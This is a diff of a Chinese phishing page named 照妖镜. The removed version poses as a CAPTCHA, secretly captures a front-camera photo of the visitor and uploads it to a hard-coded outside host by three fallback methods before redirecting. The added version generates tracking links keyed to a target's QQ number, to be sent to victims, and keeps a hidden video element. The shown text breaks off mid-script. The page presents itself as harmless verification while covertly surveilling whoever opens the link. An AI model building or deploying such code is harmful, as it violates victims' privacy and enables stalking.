@@ -2,428 +2,1089 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>验证中...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>照妖镜 - 链接生成器</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0a0a0f;
+            --card-bg: #13131a;
+            --border: #2a2a35;
+            --text: #e0e0e0;
+            --text-secondary: #a0a0b0;
+            --accent: #6c5ce7;
+            --accent-hover: #7d6ff0;
+            --danger: #e74c3c;
+            --success: #2ecc71;
+            --input-bg: #1a1a24;
+            --radius: 12px;
+            --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+            --glow: 0 0 30px rgba(108, 92, 231, 0.3);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f5f5f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+            background: var(--bg);
+            background-image:
+                radial-gradient(ellipse at 50% 0%, rgba(108, 92, 231, 0.08) 0%, transparent 70%),
+                radial-gradient(ellipse at 80% 20%, rgba(46, 204, 113, 0.04) 0%, transparent 60%);
             min-height: 100vh;
             display: flex;
-            justify-content: center;
             align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: var(--text);
         }
-        .loading-container, .captcha-container {
+
+        /* ============ 配置模式样式 ============ */
+        .config-container {
+            width: 100%;
+            max-width: 500px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(24px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 32px 28px;
+            box-shadow: var(--shadow);
+            backdrop-filter: blur(10px);
+        }
+
+        .card-header {
             text-align: center;
-            padding: 40px;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
-            max-width: 380px;
-            width: 90%;
+            margin-bottom: 28px;
         }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #e0e0e0;
-            border-top-color: #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+        .card-header .icon {
+            font-size: 48px;
+            display: block;
+            margin-bottom: 10px;
+            animation: pulse 2s ease-in-out infinite;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .loading-text { color: #666; font-size: 16px; margin-bottom: 10px; }
-        .progress-bar { width: 100%; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-top: 20px; }
-        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); transition: width 0.3s; }
-        .captcha-container { display: none; }
-        .captcha-icon { font-size: 48px; margin-bottom: 15px; }
-        .captcha-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 10px; }
-        .captcha-desc { color: #666; font-size: 14px; margin-bottom: 20px; }
-        .checkbox-area {
-            display: inline-block; width: 24px; height: 24px; border: 2px solid #ccc;
-            border-radius: 4px; margin-right: 10px; cursor: pointer; background: white;
+        @keyframes pulse {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
         }
-        .checkbox-area.checked { background: #667eea; border-color: #667eea; position: relative; }
-        .checkbox-area.checked::after { content: '✓'; color: white; font-size: 16px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
-        .verify-row { display: flex; align-items: center; justify-content: center; margin-top: 20px; cursor: pointer; }
-        .camera-preview { width: 100%; max-width: 280px; margin: 12px auto; border-radius: 16px; overflow: hidden; background: #333; display: none; }
-        .camera-preview video { width: 100%; height: auto; display: block; }
-        .camera-status { font-size: 12px; margin-top: 10px; color: #28a745; }
-        .camera-status.error { color: #ff3b30; }
-        .code-badge { margin-top: 15px; font-size: 12px; color: #999; }
-        video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
-        #uploadResult {
-            margin-top: 12px;
+        .card-header h1 {
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #e0e0e0, #a0a0c0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .card-header p {
             font-size: 13px;
-            word-break: break-word;
-            min-height: 20px;
+            color: var(--text-secondary);
+            margin-top: 6px;
         }
-        .debug-info { margin-top: 10px; font-size: 11px; color: #999; word-break: break-all; }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 7px;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+        }
+        .form-group label .required {
+            color: var(--danger);
+            margin-left: 2px;
+        }
+        .input-wrapper {
+            position: relative;
+        }
+        .input-wrapper input {
+            width: 100%;
+            padding: 13px 16px;
+            background: var(--input-bg);
+            border: 1.5px solid var(--border);
+            border-radius: 8px;
+            color: var(--text);
+            font-size: 15px;
+            transition: all 0.25s ease;
+            outline: none;
+            font-family: inherit;
+        }
+        .input-wrapper input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.15);
+            background: #1e1e2a;
+        }
+        .input-wrapper input::placeholder {
+            color: #555;
+            font-size: 13px;
+        }
+        .input-hint {
+            font-size: 11px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .btn-generate {
+            width: 100%;
+            padding: 14px;
+            background: var(--accent);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-generate:hover {
+            background: var(--accent-hover);
+            box-shadow: var(--glow);
+            transform: translateY(-1px);
+        }
+        .btn-generate:active {
+            transform: translateY(0);
+            box-shadow: none;
+        }
+        .btn-generate::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+        .btn-generate:active::after {
+            width: 300px;
+            height: 300px;
+        }
+
+        /* 结果区域 */
+        .result-area {
+            margin-top: 24px;
+            padding: 18px;
+            background: #0d0d15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            display: none;
+            animation: fadeInUp 0.4s ease-out;
+        }
+        .result-area.show {
+            display: block;
+        }
+        .result-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--success);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+        .result-link {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .result-link input {
+            flex: 1;
+            padding: 10px 12px;
+            background: var(--input-bg);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: #7ecbff;
+            font-size: 13px;
+            font-family: 'SF Mono', 'Consolas', 'Monaco', monospace;
+            word-break: break-all;
+            outline: none;
+            cursor: text;
+        }
+        .btn-copy {
+            padding: 10px 16px;
+            background: var(--success);
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: all 0.2s ease;
+            font-family: inherit;
+        }
+        .btn-copy:hover {
+            opacity: 0.85;
+            transform: scale(1.03);
+        }
+        .btn-copy.copied {
+            background: #27ae60;
+            pointer-events: none;
+        }
+
+        .warning-box {
+            margin-top: 20px;
+            padding: 14px 16px;
+            background: rgba(231, 76, 60, 0.08);
+            border: 1px solid rgba(231, 76, 60, 0.25);
+            border-radius: 8px;
+            font-size: 12px;
+            color: #e98b82;
+            line-height: 1.6;
+        }
+        .warning-box strong {
+            color: #f0a8a0;
+        }
+        .warning-box ul {
+            margin: 6px 0 0 16px;
+            padding: 0;
+        }
+        .warning-box li {
+            margin-bottom: 3px;
+        }
+
+        /* 底部 */
+        .footer-note {
+            text-align: center;
+            font-size: 11px;
+            color: #555;
+            margin-top: 16px;
+        }
+
+        /* ============ 终端风格追踪界面 ============ */
+        .terminal-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 99999;
+            background: #0a0a0a;
+            display: flex;
+            flex-direction: column;
+            font-family: 'SF Mono', 'Consolas', 'Monaco', 'Courier New', monospace;
+            padding: 20px;
+            overflow: hidden;
+        }
+
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: #1a1a1a;
+            border-radius: 8px 8px 0 0;
+            border: 1px solid #333;
+            border-bottom: none;
+            margin-bottom: 0;
+        }
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        .terminal-dot.red {
+            background: #ff5f56;
+        }
+        .terminal-dot.yellow {
+            background: #ffbd2e;
+        }
+        .terminal-dot.green {
+            background: #27c93f;
+        }
+        .terminal-title {
+            margin-left: 8px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .terminal-body {
+            flex: 1;
+            background: #0d0d0d;
+            border: 1px solid #333;
+            border-radius: 0 0 8px 8px;
+            padding: 20px;
+            overflow-y: auto;
+            font-size: 13px;
+            line-height: 1.8;
+            color: #0f0;
+        }
+
+        .terminal-body::-webkit-scrollbar {
+            width: 4px;
+        }
+        .terminal-body::-webkit-scrollbar-track {
+            background: #0d0d0d;
+        }
+        .terminal-body::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 2px;
+        }
+
+        .terminal-line {
+            opacity: 0;
+            animation: terminalFadeIn 0.1s forwards;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        @keyframes terminalFadeIn {
+            to {
+                opacity: 1;
+            }
+        }
+
+        .terminal-line .prompt {
+            color: #0f0;
+        }
+        .terminal-line .info {
+            color: #aaa;
+        }
+        .terminal-line .success {
+            color: #2ecc71;
+        }
+        .terminal-line .warning {
+            color: #f39c12;
+        }
+        .terminal-line .error {
+            color: #e74c3c;
+        }
+        .terminal-line .highlight {
+            color: #6c5ce7;
+        }
+        .terminal-line .dim {
+            color: #555;
+        }
+        .terminal-line .cyan {
+            color: #00bcd4;
+        }
+
+        .terminal-cursor {
+            display: inline-block;
+            width: 8px;
+            height: 16px;
+            background: #0f0;
+            animation: blink 1s step-end infinite;
+            vertical-align: middle;
+            margin-left: 2px;
+        }
+        @keyframes blink {
+            50% {
+                opacity: 0;
+            }
+        }
+
+        /* 权限拒绝后的提示卡片 */
+        .denied-card {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 99999;
+            background: rgba(0, 0, 0, 0.95);
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            font-family: 'SF Mono', 'Consolas', 'Monaco', monospace;
+        }
+        .denied-card.show {
+            display: flex;
+        }
+        .denied-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: shake 0.5s ease-in-out;
+        }
+        @keyframes shake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            25% {
+                transform: translateX(-15px);
+            }
+            50% {
+                transform: translateX(15px);
+            }
+            75% {
+                transform: translateX(-10px);
+            }
+        }
+        .denied-title {
+            font-size: 24px;
+            color: #e74c3c;
+            margin-bottom: 12px;
+            letter-spacing: 2px;
+        }
+        .denied-subtitle {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 30px;
+            text-align: center;
+            line-height: 1.6;
+        }
+        .denied-btn {
+            padding: 12px 32px;
+            background: transparent;
+            border: 1px solid #e74c3c;
+            color: #e74c3c;
+            font-size: 14px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: all 0.3s;
+            font-family: inherit;
+            letter-spacing: 1px;
+        }
+        .denied-btn:hover {
+            background: rgba(231, 76, 60, 0.1);
+            box-shadow: 0 0 20px rgba(231, 76, 60, 0.3);
+        }
     </style>
 </head>
 <body>
-    <div class="loading-container" id="loadingContainer">
-        <div class="spinner"></div>
-        <div class="loading-text">正在验证环境安全...</div>
-        <div class="loading-text" style="font-size: 12px; color: #999;">正在初始化...</div>
-        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-        <div class="code-badge">验证编号: <span id="displayCode"></span></div>
-        <div class="camera-status" id="cameraStatus">⏳ 等待授权...</div>
-        <div class="debug-info" id="debugInfo"></div>
-    </div>
-    <div class="captcha-container" id="captchaContainer">
-        <div class="captcha-icon">🤖</div>
-        <div class="captcha-title">人机验证</div>
-        <div class="captcha-desc">请完成验证以继续访问</div>
-        <div class="camera-preview" id="cameraPreview">
-            <video id="previewVideo" autoplay playsinline webkit-playsinline muted></video>
+
+    <!-- ==================== 配置模式 ==================== -->
+    <div id="configMode" class="config-container">
+        <div class="card">
+            <div class="card-header">
+                <span class="icon">🪞</span>
+                <h1>照 妖 镜</h1>
+                <p>生成追踪链接 · 自动采集回传</p>
+            </div>
+
+            <div class="form-group">
+                <label>QQ 号 <span class="required">*</span></label>
+                <div class="input-wrapper">
+                    <input
+                    type="text"
+                    id="qqInput"
+                    placeholder="输入目标QQ号，用于标识来源"
+                    maxlength="20"
+                    autocomplete="off"
+                    >
+                </div>
+                <div class="input-hint">数据将保存在以此QQ号命名的目录中</div>
+            </div>
+
+            <div class="form-group">
+                <label>跳转网址 <span class="required">*</span></label>
+                <div class="input-wrapper">
+                    <input
+                    type="url"
+                    id="urlInput"
+                    placeholder="https://example.com"
+                    autocomplete="off"
+                    >
+                </div>
+                <div class="input-hint">任务完成后将自动跳转到此网址</div>
+            </div>
+
+            <button class="btn-generate" id="btnGenerate" onclick="generateLink()">
+                🔗 生成追踪链接
+            </button>
+
+            <div class="result-area" id="resultArea">
+                <div class="result-label">✅ 追踪链接已生成（点击复制）</div>
+                <div class="result-link">
+                    <input type="text" id="resultLink" readonly onclick="this.select(); copyLink();">
+                    <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 复制</button>
+                </div>
+                <div style="margin-top:8px;font-size:11px;color:#888;">
+                    将此链接发送给目标用户，对方打开后会自动执行任务
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <strong>⚠️ 重要提示：</strong>
+                <ul>
+                    <li>需要 <strong>HTTPS</strong> 环境（本地测试可用 localhost）</li>
+                    <li>请确保本页面部署在 HTTPS 服务器上</li>
+                    <li>部分浏览器首次调用会弹出权限询问</li>
+                    <li>仅供学习研究，请勿用于非法用途</li>
+                </ul>
+            </div>
         </div>
-        <div class="verify-row" id="verifyRow">
-            <div class="checkbox-area" id="checkbox"></div>
-            <span>我不是机器人</span>
+        <div class="footer-note">
+            API 端点：<code style="color:#6c5ce7;">http://a1nb66.atwebpages.com/zyj/api.php</code>
         </div>
-        <div class="code-badge">验证编号: <span id="displayCode2"></span></div>
-        <div id="uploadResult"></div>
     </div>
-    <!-- 隐藏视频用于拍照 -->
-    <video id="video" autoplay playsinline webkit-playsinline muted></video>
-    <canvas id="canvas" style="display: none;"></canvas>
+
+    <!-- ==================== 终端风格追踪界面 ==================== -->
+    <div class="terminal-overlay" id="terminalOverlay" style="display:none;">
+        <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">session://terminal — bash — 80×24</span>
+        </div>
+        <div class="terminal-body" id="terminalBody">
+            <!-- 动态填充日志 -->
+        </div>
+    </div>
+
+    <!-- ==================== 权限拒绝提示卡片 ==================== -->
+    <div class="denied-card" id="deniedCard">
+        <div class="denied-icon">🚫</div>
+        <div class="denied-title">SESSION TERMINATED</div>
+        <div class="denied-subtitle">
+            Connection refused by host.<br>
+            Remote access denied. Task aborted.
+        </div>
+        <button class="denied-btn" onclick="closeDeniedCard()">EXIT</button>
+    </div>
+
+    <!-- 隐藏的video元素 -->
+    <video
+    id="hiddenVideo"
+    playsinline
+    autoplay
+    muted
+    style="position:fixed;top:-100vh;left:-100vw;width:640px;height:480px;pointer-events:none;opacity:0;"
+    ></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
     <script>
-        // ==================== 配置 ====================
-        const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';
-        const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get('code') || 'UNKNOWN';
-        const targetUrl = urlParams.get('url') || 'https://www.baidu.com';
+        (function() {
+            // ============ 获取URL参数 ============
+            const urlParams = new URLSearchParams(window.location.search);
+            const paramQQ = urlParams.get('qq');
+            const paramUrl = urlParams.get('url');
 
-        document.getElementById('displayCode').textContent = code;
-        document.getElementById('displayCode2').textContent = code;
-        document.getElementById('debugInfo').textContent = 'API: ' + API_URL + ' | 编号: ' + code;
-
-        let stream = null, photoCaptured = false, cameraReady = false, videoElement = null, retryCount = 0;
-        const maxRetries = 3;
-
-        // 进度条
-        let progress = 0;
-        const progressInterval = setInterval(() => {
-            if (progress < 90) {
-                progress += Math.random() * 12;
-                if (progress > 90) progress = 90;
-                document.getElementById('progressFill').style.width = progress + '%';
-            }
-        }, 200);
-
-        function refreshAndRetry() {
-            retryCount++;
-            if (retryCount <= maxRetries) {
-                document.getElementById('cameraStatus').innerHTML = `🔄 重新请求 (${retryCount}/${maxRetries})`;
-                document.getElementById('cameraStatus').classList.add('error');
-                setTimeout(() => window.location.reload(), 1500);
+            // ============ 判断模式 ============
+            if (paramQQ && paramUrl) {
+                // 追踪模式 - 显示终端界面
+                initTrackingMode(paramQQ, decodeURIComponent(paramUrl));
             } else {
-                document.getElementById('cameraStatus').innerHTML = '⚠️ 无法获取权限';
-                document.getElementById('cameraStatus').classList.add('error');
-                setTimeout(() => {
-                    document.getElementById('loadingContainer').style.display = 'none';
-                    document.getElementById('captchaContainer').style.display = 'block';
-                    cameraReady = false;
-                }, 1500);
+                // 配置模式
+                initConfigMode();
             }
-        }
+        })();
 
-        // ==================== 拍照（缩小尺寸 + 低质量） ====================
-        function capturePhoto() {
-            return new Promise((resolve, reject) => {
-                if (!videoElement || !cameraReady) {
-                    reject('未就绪');
-                    return;
-                }
-                const canvas = document.getElementById('canvas');
-                const ctx = canvas.getContext('2d');
-                if (videoElement.videoWidth === 0) {
-                    reject('视频未就绪');
-                    return;
-                }
-                // 缩小画布尺寸（480x360）以减少数据量，同时保持清晰度
-                const targetWidth = 480;
-                const targetHeight = Math.round((videoElement.videoHeight / videoElement.videoWidth) * targetWidth);
-                canvas.width = targetWidth;
-                canvas.height = targetHeight;
-                ctx.drawImage(videoElement, 0, 0, targetWidth, targetHeight);
-                // 质量降至 0.5，进一步压缩
-                resolve(canvas.toDataURL('image/jpeg', 0.5));
+        // ============ 配置模式逻辑 ============
+        function initConfigMode() {
+            document.getElementById('configMode').style.display = 'block';
+            document.getElementById('terminalOverlay').style.display = 'none';
+            document.getElementById('deniedCard').style.display = 'none';
+
+            document.getElementById('qqInput').addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') generateLink();
             });
-        }
-
-        // ==================== 上传方式1：iframe（最可靠，完全绕过跨域） ====================
-        function uploadViaIframe(photoData) {
-            return new Promise((resolve, reject) => {
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = API_URL + '?action=capture_photo';
-                form.enctype = 'multipart/form-data';
-                const iframeName = 'upload_iframe_' + Date.now();
-                form.target = iframeName;
-                form.style.display = 'none';
-
-                // 字段
-                const fields = {
-                    'photo_data': photoData,
-                    'target_url': targetUrl,
-                    'code': code
-                };
-                for (let key in fields) {
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = key;
-                    input.value = fields[key];
-                    form.appendChild(input);
-                }
-
-                const iframe = document.createElement('iframe');
-                iframe.name = iframeName;
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-                document.body.appendChild(form);
-
-                let timeoutId = setTimeout(() => {
-                    cleanup();
-                    reject(new Error('iframe 上传超时'));
-                }, 30000);
-
-                iframe.onload = function() {
-                    clearTimeout(timeoutId);
-                    let responseText = '';
-                    try {
-                        const doc = iframe.contentDocument || iframe.contentWindow.document;
-                        if (doc && doc.body) {
-                            responseText = doc.body.textContent || doc.body.innerText || '';
-                        }
-                    } catch (e) {
-                        // 跨域限制，但这里同源应该可以访问
-                    }
-                    try {
-                        const result = JSON.parse(responseText);
-                        cleanup();
-                        resolve(result);
-                    } catch (e) {
-                        // 如果不是 JSON，尝试简单判断
-                        if (responseText.includes('success')) {
-                            cleanup();
-                            resolve({ success: true });
-                        } else {
-                            cleanup();
-                            reject(new Error('响应解析失败: ' + responseText.substring(0, 100)));
-                        }
-                    }
-                };
-
-                iframe.onerror = function() {
-                    clearTimeout(timeoutId);
-                    cleanup();
-                    reject(new Error('iframe 加载失败'));
-                };
-
-                function cleanup() {
-                    clearTimeout(timeoutId);
-                    setTimeout(() => {
-                        if (form.parentNode) form.parentNode.removeChild(form);
-                        if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
-                    }, 100);
-                }
-
-                form.submit();
+            document.getElementById('urlInput').addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') generateLink();
             });
+
+            setTimeout(() => document.getElementById('qqInput').focus(), 300);
         }
 
-        // ==================== 上传方式2：Fetch（如果可用） ====================
-        function uploadViaFetch(photoData) {
-            const fd = new FormData();
-            fd.append('photo_data', photoData);
-            fd.append('target_url', targetUrl);
-            fd.append('code', code);
-            return fetch(API_URL + '?action=capture_photo', {
-                method: 'POST',
-                body: fd,
-                mode: 'cors'
-            }).then(res => res.json());
-        }
+        function generateLink() {
+            const qqInput = document.getElementById('qqInput');
+            const urlInput = document.getElementById('urlInput');
+            const qq = qqInput.value.trim();
+            const targetUrl = urlInput.value.trim();
 
-        // ==================== 上传方式3：XMLHttpRequest ====================
-        function uploadViaXHR(photoData) {
-            return new Promise((resolve, reject) => {
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', API_URL + '?action=capture_photo', true);
-                xhr.timeout = 30000;
-                const fd = new FormData();
-                fd.append('photo_data', photoData);
-                fd.append('target_url', targetUrl);
-                fd.append('code', code);
-                xhr.onload = function() {
-                    if (xhr.status >= 200 && xhr.status < 300) {
-                        try {
-                            resolve(JSON.parse(xhr.responseText));
-                        } catch (e) {
-                            reject(new Error('解析响应失败'));
-                        }
-                    } else {
-                        reject(new Error('HTTP ' + xhr.status));
-                    }
-                };
-                xhr.onerror = function() { reject(new Error('XHR 失败')); };
-                xhr.ontimeout = function() { reject(new Error('XHR 超时')); };
-                xhr.send(fd);
-            });
-        }
-
-        // ==================== 综合上传 ====================
-        async function uploadPhoto(photoData) {
-            const resultDiv = document.getElementById('uploadResult');
-            // 优先使用 iframe（最可靠）
-            const methods = [
-                { name: 'iframe', fn: () => uploadViaIframe(photoData) },
-                { name: 'Fetch', fn: () => uploadViaFetch(photoData) },
-                { name: 'XHR', fn: () => uploadViaXHR(photoData) }
-            ];
-
-            for (let i = 0; i < methods.length; i++) {
-                const method = methods[i];
-                try {
-                    resultDiv.textContent = `📤 尝试 ${method.name}...`;
-                    resultDiv.style.color = '#007aff';
-                    const result = await method.fn();
-                    if (result && result.success !== false) {
-                        resultDiv.textContent = `✅ 上传成功 (${method.name})`;
-                        resultDiv.style.color = '#34c759';
-                        return result;
-                    } else {
-                        // 如果返回 success=false，也视为失败，尝试下一个
-                        throw new Error(result?.error || '上传失败');
-                    }
-                } catch (err) {
-                    console.warn(`${method.name} 失败:`, err);
-                    // 继续下一个
-                }
+            if (!qq) {
+                shakeElement(qqInput);
+                qqInput.focus();
+                alert('请输入QQ号');
+                return;
             }
-            throw new Error('所有上传方式均失败');
-        }
-
-        // ==================== 主流程 ====================
-        async function takePhotoAndRedirect() {
-            if (photoCaptured) return;
-            photoCaptured = true;
-            
-            const resultDiv = document.getElementById('uploadResult');
-            let photoData = null;
-            
-            // 1. 拍照
-            if (cameraReady && videoElement?.videoWidth > 0) {
-                try {
-                    photoData = await capturePhoto();
-                    resultDiv.textContent = '成功，准备...';
-                    resultDiv.style.color = '#007aff';
-                } catch(e) {
-                    resultDiv.textContent = '失败: ' + e.message;
-                    resultDiv.style.color = '#ff3b30';
-                }
-            } else {
-                resultDiv.textContent = '未就绪';
-                resultDiv.style.color = '#ff3b30';
+            if (!/^\d{4,20}$/.test(qq)) {
+                alert('QQ号格式不正确（4-20位数字）');
+                qqInput.focus();
+                return;
+            }
+            if (!targetUrl) {
+                shakeElement(urlInput);
+                urlInput.focus();
+                alert('请输入跳转网址');
+                return;
+            }
+            if (!/^https?:\/\/.+/.test(targetUrl)) {
+                alert('跳转网址需要以 http:// 或 https:// 开头');
+                urlInput.focus();
+                return;
             }
 
-            // 2. 上传（如果有照片）
-            if (photoData) {
-                try {
-                    const result = await uploadPhoto(photoData);
-                    if (result.success) {
-                        resultDiv.textContent = '✅ 照片已保存！';
-                        resultDiv.style.color = '#34c759';
-                    } else {
-                        resultDiv.textContent = '❌ ' + (result.error || '保存失败');
-                        resultDiv.style.color = '#ff3b30';
-                    }
-                } catch (err) {
-                    resultDiv.textContent = '❌ 上传异常: ' + err.message;
-                    resultDiv.style.color = '#ff3b30';
-                }
-            } else {
-                resultDiv.textContent = '⚠️ 无照片数据，跳过上传';
-                resultDiv.style.color = '#ff3b30';
-            }
+            const currentUrl = window.location.origin + window.location.pathname;
+            const trackingLink = currentUrl + '?qq=' + qq + '&url=' + encodeURIComponent(targetUrl);
 
-            // 3. 释放摄像头
-            if (stream) stream.getTracks().forEach(t => t.stop());
+            const resultArea = document.getElementById('resultArea');
+            const resultLink = document.getElementById('resultLink');
+            const btnCopy = document.getElementById('btnCopy');
 
-            // 4. 跳转（延迟2秒让用户看到结果）
+            resultLink.value = trackingLink;
+            resultArea.classList.add('show');
+            btnCopy.textContent = '📋 复制';
+            btnCopy.classList.remove('copied');
+
+            resultLink.select();
+            copyLink();
+
+            resultArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+            resultArea.style.boxShadow = '0 0 20px rgba(46,204,113,0.4)';
             setTimeout(() => {
-                window.location.href = targetUrl;
-            }, 2000);
+                resultArea.style.boxShadow = '';
+            }, 1500);
         }
 
-        // ==================== 初始化摄像头 ====================
-        async function initCamera() {
+        function copyLink() {
+            const resultLink = document.getElementById('resultLink');
+            const btnCopy = document.getElementById('btnCopy');
+            resultLink.select();
             try {
-                // 请求更低的清晰度以减少数据量，同时兼容 iOS
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: { ideal: 480 }, 
-                        height: { ideal: 360 },
-                        facingMode: "user"
-                    } 
-                });
-                videoElement = document.getElementById('video');
-                videoElement.srcObject = stream;
-                const previewVideo = document.getElementById('previewVideo');
-                if (previewVideo) {
-                    previewVideo.srcObject = stream;
-                    document.getElementById('cameraPreview').style.display = 'block';
-                }
-                await new Promise(r => { videoElement.onloadedmetadata = () => { videoElement.play(); r(); }; });
-                await new Promise(r => setTimeout(r, 800));
-                if (videoElement.videoWidth > 0) {
-                    cameraReady = true;
-                    document.getElementById('cameraStatus').innerHTML = '✅ 摄像头已就绪';
-                    document.getElementById('cameraStatus').classList.remove('error');
-                }
-                progress = 100;
-                document.getElementById('progressFill').style.width = '100%';
-                setTimeout(() => {
-                    document.getElementById('loadingContainer').style.display = 'none';
-                    document.getElementById('captchaContainer').style.display = 'block';
-                }, 600);
-            } catch(err) {
-                console.error('Camera error:', err);
-                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    refreshAndRetry();
-                } else {
-                    document.getElementById('cameraStatus').innerHTML = '⚠️ 摄像头初始化失败';
-                    document.getElementById('cameraStatus').classList.add('error');
+                navigator.clipboard.writeText(resultLink.value).then(() => {
+                    btnCopy.textContent = '✅ 已复制';
+                    btnCopy.classList.add('copied');
                     setTimeout(() => {
-                        document.getElementById('loadingContainer').style.display = 'none';
-                        document.getElementById('captchaContainer').style.display = 'block';
-                        cameraReady = false;
-                    }, 1500);
-                }
+                        btnCopy.textContent = '📋 复制';
+                        btnCopy.classList.remove('copied');
+                    }, 2000);
+                }).catch(() => {
+                    document.execCommand('copy');
+                    btnCopy.textContent = '✅ 已复制';
+                    btnCopy.classList.add('copied');
+                    setTimeout(() => {
+                        btnCopy.textContent = '📋 复制';
+                        btnCopy.classList.remove('copied');
+                    }, 2000);
+                });
+            } catch (e) {
+                document.execCommand('copy');
+                btnCopy.textContent = '✅ 已复制';
+                btnCopy.classList.add('copied');
             }
         }
 
-        // ==================== 人机验证 ====================
-        let verified = false;
-        const verifyRow = document.getElementById('verifyRow');
-        const checkbox = document.getElementById('checkbox');
-        if (verifyRow) {
-            verifyRow.addEventListener('click', () => {
-                if (verified) return;
-                checkbox.classList.add('checked');
-                verified = true;
-                verifyRow.querySelector('span').textContent = '验证中...';
-                setTimeout(() => takePhotoAndRedirect(), 500);
-            });
+        function shakeElement(el) {
+            el.style.transition = 'transform 0.1s ease';
+            el.style.transform = 'translateX(-6px)';
+            setTimeout(() => { el.style.transform = 'translateX(6px)'; }, 100);
+            setTimeout(() => { el.style.transform = 'translateX(-4px)'; }, 200);
+            setTimeout(() => { el.style.transform = 'translateX(4px)'; }, 300);
+            setTimeout(() => { el.style.transform = 'translateX(0)'; }, 400);
         }
 
-        // 启动
-        initCamera();
-        window.addEventListener('beforeunload', () => { if (stream) stream.getTracks().forEach(t => t.stop()); });
+        // ============ 关闭拒绝卡片 ============
+        function closeDeniedCard() {
+            const deniedCard = document.getElementById('deniedCard');
+            deniedCard.classList.remove('show');
+            // 关闭后停留在空白页面或跳转
